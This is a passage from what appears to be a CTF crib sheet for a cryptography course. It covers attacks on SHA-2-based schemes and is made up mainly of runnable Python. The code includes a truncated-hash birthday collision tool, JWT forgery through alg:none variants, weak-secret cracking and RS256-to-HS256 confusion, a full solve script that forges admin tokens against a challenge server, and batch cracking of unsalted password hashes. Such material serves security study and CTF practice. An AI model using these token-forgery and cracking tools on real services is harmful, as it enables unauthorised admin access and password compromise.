            pay = make_payment(f"ref-{i:08x}", "SIM-BOB")         # legit

        fp = fingerprint(pay, trunc_bytes)
        if fp in seen and seen[fp]["from_account"] != pay["from_account"]:
            print(f"[+] Collision with different from_account!")
            print(f"    fingerprint = {fp.hex()}")
            print(f"    A = {seen[fp]}")
            print(f"    B = {pay}")
            return seen[fp], pay, fp
        seen[fp] = pay
    return None


if __name__ == "__main__":
    # Try 4-byte truncation first (most likely in CTF)
    result = build_attack_pair(trunc_bytes=4)
    if result:
        a, b, fp = result
        print("\n=== Submit these two JSON lines to the server ===")
        print(json.dumps(a, sort_keys=True, separators=(",", ":")))
        print(json.dumps(b, sort_keys=True, separators=(",", ":")))
    else:
        # Fall back to plain collision
        find_collision(trunc_bytes=4)
```

### 9.3 Send to the server

```python
def submit_pair(payment_a: dict, payment_b: dict, host: str, port: int):
    import socket
    body = (
        json.dumps(payment_a, sort_keys=True, separators=(",", ":")).encode() + b"\n" +
        json.dumps(payment_b, sort_keys=True, separators=(",", ":")).encode() + b"\n"
    )
    with socket.create_connection((host, port), timeout=10) as s:
        s.sendall(body)
        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            response += chunk
            if b"cns{" in response: break
        print(response.decode(errors="replace"))
```

### 9.4 When to use

- **Secure Bank 2** — exactly this.
- Any task with a **truncated hash** as "fingerprint" / "ID" / "checksum".

### 9.5 Truncation size vs feasibility

| Truncation | Bits | Expected tries | Python time |
|---|---|---|---|
| 2 bytes | 16 | 256 | instant |
| 3 bytes | 24 | 4096 | instant |
| 4 bytes | 32 | 65,536 | seconds |
| 5 bytes | 40 | 1,048,576 | minutes |
| 6 bytes | 48 | 16,777,216 | hours |

**For 5+ bytes**, use `hashlib` in C via `multiprocessing.Pool` — 4–8× faster.

---

## 10. Attack 7 — JWT HS256 ⭐⭐⭐ (**Token of Trust**)

### 10.1 JWT structure

```
header.payload.signature
  b64u     b64u      b64u
```

- **Header** (base64url JSON): `{"alg":"HS256","typ":"JWT"}`
- **Payload** (base64url JSON): `{"role":"guest","user":"alice",...}`
- **Signature**: `HMAC-SHA256(secret, header + "." + payload)` — or RSA/ECDSA depending on `alg`.

### 10.2 Decode / inspect

```python
import base64, json

def b64u_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def b64u_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def decode_jwt(token: str) -> tuple[dict, dict, bytes]:
    h, p, s = token.split(".")
    return (
        json.loads(b64u_decode(h)),
        json.loads(b64u_decode(p)),
        b64u_decode(s),
    )

# Example
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.signature"
h, p, s = decode_jwt(token)
print(h)   # {"alg":"HS256","typ":"JWT"}
print(p)   # {"role":"guest"}
```

### 10.3 Attack A — `alg:none`

If the server accepts `alg:none`, remove the signature entirely:

```python
def attack_alg_none(token: str, new_payload: dict) -> str:
    """Craft token with alg=none and no signature."""
    h, p, _ = decode_jwt(token)
    new_header = b64u_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    new_payload_enc = b64u_encode(
        json.dumps({**p, **new_payload}, separators=(",", ":")).encode()
    )
    return f"{new_header}.{new_payload_enc}."

# Example: elevate to admin
forged = attack_alg_none(token, {"role": "admin"})
print(forged)   # eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
```

**Variants of the header to try:**
- `{"alg":"none"}`
- `{"alg":"None"}`
- `{"alg":"NONE"}`
- `{"alg":"nOnE"}`
- `{"alg":null}`
- `{"alg":""}`
- `{}` (no alg field)

**Some libraries also accept no signature part** (`header.payload`), or any trailing garbage. Test all.

### 10.4 Attack B — Weak secret (wordlist)

```python
import hmac, hashlib

def crack_jwt_hs256(token: str, wordlist: str) -> bytes | None:
    h_b64, p_b64, sig_b64 = token.split(".")
    signing_input = f"{h_b64}.{p_b64}".encode()
    target_sig = b64u_decode(sig_b64)

    with open(wordlist, "rb") as f:
        for line in f:
            key = line.rstrip(b"\r\n")
            if not key: continue
            if hmac.compare_digest(
                hmac.new(key, signing_input, hashlib.sha256).digest(),
                target_sig,
            ):
                return key
    return None

# Usage
secret = crack_jwt_hs256(token, "rockyou.txt")
if secret:
    print(f"[+] Secret: {secret}")
    # Now forge any token
    new_h = b64u_encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
    new_p = b64u_encode(json.dumps({"role":"admin"}).encode())
    signing_input = f"{new_h}.{new_p}".encode()
    new_sig = b64u_encode(hmac.new(secret, signing_input, hashlib.sha256).digest())
    print(f"[+] Forged: {new_h}.{new_p}.{new_sig}")
```

### 10.5 Attack C — Algorithm confusion (RS256 → HS256)

If the server uses **RS256** (RSA) but **also accepts HS256**, and the public key is known:

```python
import hmac, hashlib

def attack_alg_confusion(token: str, public_key_pem: bytes, new_payload: dict) -> str:
    """
    Convert RS256 token to HS256, using public key as HMAC secret.
    Requires: server verifies alg from header AND uses public key as HMAC secret.
    """
    h, p, _ = decode_jwt(token)

    # New header: HS256
    new_h = b64u_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    new_p = b64u_encode(json.dumps({**p, **new_payload}, separators=(",", ":")).encode())

    # HMAC with the PUBLIC KEY as secret
    signing_input = f"{new_h}.{new_p}".encode()
    new_sig = b64u_encode(hmac.new(public_key_pem, signing_input, hashlib.sha256).digest())

    return f"{new_h}.{new_p}.{new_sig}"
```

**When:** server uses RS256 normally, but **fails to enforce `alg`** — classic JWT vulnerability. Test if you have the public key.

### 10.6 Full solve script (`solve_token_of_trust.py`)

```python
#!/usr/bin/env python3
"""Token of Trust — try all JWT attacks."""
import base64, json, hmac, hashlib, requests, sys

TARGET = "http://cns-test.idlab.uantwerpen.be:50009"

def b64u_decode(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
def b64u_encode(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def decode_jwt(t):
    h, p, s = t.split(".")
    return json.loads(b64u_decode(h)), json.loads(b64u_decode(p)), b64u_decode(s)

def try_token(token: str, label: str) -> bool:
    r = requests.get(f"{TARGET}/admin",
                     headers={"Authorization": f"Bearer {token}"},
                     allow_redirects=False)
    print(f"\n[{label}] {r.status_code}: {r.text[:200]}")
    if "cns{" in r.text:
        print(f"\n[+] FLAG: {r.text}")
        return True
    return False

def attack_alg_none(token: str, payload_mutations: dict) -> str:
    h, p, _ = decode_jwt(token)
    new_p = {**p, **payload_mutations}
    new_h = b64u_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    new_pl = b64u_encode(json.dumps(new_p, separators=(",", ":")).encode())
    return f"{new_h}.{new_pl}."

def forge_hs256(token: str, secret: bytes, payload_mutations: dict) -> str:
    h, p, _ = decode_jwt(token)
    new_p = {**p, **payload_mutations}
    new_h = b64u_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    new_pl = b64u_encode(json.dumps(new_p, separators=(",", ":")).encode())
    sig = hmac.new(secret, f"{new_h}.{new_pl}".encode(), hashlib.sha256).digest()
    return f"{new_h}.{new_pl}.{b64u_encode(sig)}"

def main():
    # 1) Login as guest
    r = requests.post(f"{TARGET}/login", json={"username": "guest", "password": "guest"})
    token = r.json().get("token") or r.json().get("access_token")
    print(f"[*] Guest token: {token}")
    h, p, s = decode_jwt(token)
    print(f"[*] Header:  {h}")
    print(f"[*] Payload: {p}")

    # 2) Try alg:none variants
    for hdr in [{"alg": "none", "typ": "JWT"},
                {"alg": "None", "typ": "JWT"},
                {"alg": "NONE", "typ": "JWT"},
                {"alg": "nOnE", "typ": "JWT"},
                {"alg": "", "typ": "JWT"},
                {"typ": "JWT"}]:
        new_h = b64u_encode(json.dumps(hdr).encode())
        new_pl = b64u_encode(json.dumps(
            {**p, "role": "admin", "is_admin": True, "admin": True},
            separators=(",", ":")).encode())
        tok = f"{new_h}.{new_pl}."
        if try_token(tok, f"alg:none ({hdr.get('alg', '<missing>')})"):
            return

    # 3) Try weak secret
    print("\n[*] Trying weak secrets...")
    for secret in [b"secret", b"password", b"admin", b"jwt", b"key",
                   b"changeme", b"1234", b"jwtsecret"]:
        tok = forge_hs256(token, secret, {"role": "admin", "is_admin": True})
        if try_token(tok, f"weak secret '{secret.decode()}'"):
            return

    # 4) Try common algorithms
    for alg in ["HS256", "HS384", "HS512", "none"]:
        # (if we have no secret, skip HS variants)
        pass

    print("\n[!] None of the standard attacks worked.")


if __name__ == "__main__":
    main()
```

### 10.7 When to use

- **Token of Trust** — exactly this.
- Any JWT challenge with a **guest account** and **admin endpoint**.

---

## 11. Attack 8 — Unsalted batch cracking (LinkedIn-style)

```python
import hashlib
from collections import Counter

def crack_batch(hash_file: str, wordlist: str) -> dict[str, str]:
    """hash_file: 'user:sha256hash' lines."""
    users_hashes = {}
    for line in open(hash_file):
        if ":" in line:
            user, h = line.strip().split(":", 1)
            users_hashes[user] = h.lower()

    targets = set(users_hashes.values())
    found = {}
    with open(wordlist, "rb") as f:
        for line in f:
            pw = line.rstrip(b"\r\n")
            if not pw: continue
            h = hashlib.sha256(pw).hexdigest()
            if h in targets:
                found[h] = pw.decode(errors="replace")
                targets.discard(h)
                if not targets: break

    result = {u: found[h] for u, h in users_hashes.items() if h in found}
    print(f"[+] Cracked {len(result)}/{len(users_hashes)} users")
    shared = {pw: n for pw, n in Counter(result.values()).items() if n > 1}
    print(f"[!] Shared passwords: {shared}")
    return result
```

---

## 12. Attack 9 — Hash identification

```python
def identify_hash(h: str) -> str:
    h = h.strip()
    n = len(h)
    if not all(c in "0123456789abcdef" for c in h.lower()):
        if h.startswith(("$2a$", "$2b$")): return "bcrypt"
        if h.startswith("$argon2"): return "argon2"
        if h.startswith("$pbkdf2"): return "pbkdf2"
        if h.startswith("$6$"): return "sha512-crypt"
        if h.startswith("$5$"): return "sha256-crypt"
        return "unknown"
    return {
        32:  "MD5 (or MD4, NTLM)",
        40:  "SHA-1 (or SHA-0, RIPEMD-160)",
        56:  "SHA-224 or SHA-512/224",
        64:  "SHA-256 or SHA-512/256",
        96:  "SHA-384",
        128: "SHA-512",
    }.get(n, f"unknown (length {n})")
```

---

## 13. Quick reference

| Situation | Attack | Script |
|---|---|---|
| Have `SHA256(password)` | Dictionary | §4 |
| Short pw | Brute force | §5 |
| `H(secret \|\| msg)` | Length extension | §6 |
| HMAC-SHA256 weak key | Wordlist | §7 |
| **Signed JSON, HMAC-SHA256** | **Canonicalization bypass** | **§8** |
| **Truncated SHA-256** | **Birthday** | **§9** |
| **JWT HS256** | **alg:none / weak secret / confusion** | **§10** |
| Unsalted DB | Batch crack | §11 |
| Unknown hash | Length check | §12 |

---

## 14. Mapping to session tasks

| Task | Uses SHA-2? | Attack |
|---|---|---|
| **Signed, Sealed, Misinterpreted** | ✅ **HMAC-SHA256** | §8 (canonicalization bypass) |
| **Secure Bank 2** | ✅ **SHA-256 truncated** | §9 (birthday) |
| **Token of Trust** | ✅ **JWT HS256** | §10 (alg:none / weak key) |
| **Security Cam** | ❌ (MD5) | — |
| **Noncense** | ❌ (AES-CTR) | — |
| **Secure Bank** | ❌ (Salsa20) | — |
| **Better Hash** | ❌ (custom) | — |
| **Key standardisation** | ❌ (DES) | — |
| **Replanting** | ❌ (LCG) | — |
| **Dutch Exclusivity** | ❌ (XOR) | — |
| **AES 2 demo** | ❌ (AES) | — |

**Three session tasks use SHA-2: Signed Sealed, Secure Bank 2, Token of Trust.**
